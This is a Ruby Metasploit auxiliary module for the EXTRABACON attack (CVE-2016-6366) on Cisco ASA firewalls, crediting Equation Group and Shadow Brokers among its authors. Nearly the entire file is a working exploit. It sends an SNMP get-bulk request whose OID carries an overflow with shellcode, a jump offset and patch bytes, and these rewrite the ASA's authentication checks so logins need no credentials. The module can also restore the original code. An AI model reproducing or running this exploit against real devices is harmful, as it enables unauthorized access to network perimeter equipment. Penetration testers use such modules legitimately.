##
# auxiliary/scanner/snmp/cisco_asa_extrabacon?
##


require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  #include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco ASA Authentication Bypass (EXTRABACON)',
      'Description' => %q{
          This module patch the authentication functions of a Cisco ASA
          to allow uncredentialed logins.
        },
      'Author'      =>
        [
          'Sean Dillon <sean.dillon@risksense.com>',
          'Zachary Harding <zachary.harding@risksense.com>',
          'Nate Caroe <nate.caroe@risksense.com>',
          'Equation Group',
          'Shadow Brokers'
        ],
      'References' =>
        [
          [ 'CVE', '2016-6366'],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
    ], self.class)
  end

  def setup
  end

  def cleanup
    # Cleanup is called once for every single thread
  end

  def fw_version_check(vers_string)
    version = vers_string.split(/[^\d]/).join
    return "asa#{version}"
  end

  def run()

    begin
      datastore['VERSION'] = '2c' # 2c required it seems
      mode = datastore['MODE']

      session = rand(255) + 1

      snmp = connect_snmp

      vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
      asa_vers = fw_version_check(vers_string)

      jmp_esp_offset = "29.112.29.8"      # 0x081d701d
      saferet_offset = "134.115.39.9"     # 0x09277386
      fix_ebp        = "72"               # 0x48

      pmcheck_bounds = "0.128.183.9"      # 0x09b78000
      pmcheck_offset = "16.128.183.9"     # 0x09b78010
      pmcheck_code   = "85.49.192.137"    # 0x89c03155

      admauth_bounds = "0.80.8.8"         # 0x08085000
      admauth_offset = "64.90.8.8"        # 0x08085a40
      admauth_code   = "85.137.229.87"    # 0x57e58955

      patched_code   = "49.192.64.195"    # 0xc340c031

      # do we patch, or restore original code
      if mode == 'pass-disable'
          pmcheck_bytes = patched_code
          admauth_bytes = patched_code
      else
          pmcheck_bytes = pmcheck_code
          admauth_bytes = admauth_code
      end

      preamble_snmp = ""
      preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
      preamble_snmp += pmcheck_bounds
      preamble_snmp += ".205.128.88.187."
      preamble_snmp += admauth_bounds
      preamble_snmp += ".205.128.199.5."
      preamble_snmp += pmcheck_offset
      preamble_snmp += "."
      preamble_snmp += pmcheck_bytes
      preamble_snmp += ".199.5."
      preamble_snmp += admauth_offset
      preamble_snmp += "."
      preamble_snmp += admauth_bytes
      preamble_snmp += ".97.104."
      preamble_snmp += saferet_offset
      preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
      preamble_snmp += fix_ebp
      preamble_snmp += ".195"


      #assuming dictionary name is sc...
      #wrapper += ".144" * (82 - wrapper_len)
      #overflow = head + wrapper + ret_addr_snmp + finder_snmp
      #overflow = string.join([head, "95", wrapper, sc.my_ret_addr_snmp, sc.finder_snmp], ".")

      #wrapper = sc[asa_string]["preamble_snmp"]
      wrapper = preamble_snmp

      wrapper_len = wrapper.split('.').length
      wrapper += ".144" * (82 - wrapper_len)

      # cufwUrlfServerStatus
      head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."

      head += "9.95"
      finder_snmp = "139.124.36.20.139.7.255.224.144"

      #overflow = [head, "95", wrapper, sc[asa_string]["my_ret_addr_snmp"], sc[asa_string]["finder_snmp"]].join(".")
      overflow = [head, wrapper, jmp_esp_offset, finder_snmp].join(".")

      #varbind = SNMP::VarBind.new("#{overflow}" , SNMP::Integer.new(6))
      #value = snmp.set(varbind)
      payload = SNMP::ObjectId.new(overflow)
      response = snmp.get_bulk(0, 1, [SNMP::VarBind.new(payload)])
      list = response.varbind_list
      until list.empty?
        data = list.shift
        puts "#{data}"
      end


    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
      print_error("Cisco ASA may have crashed :/")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end

end
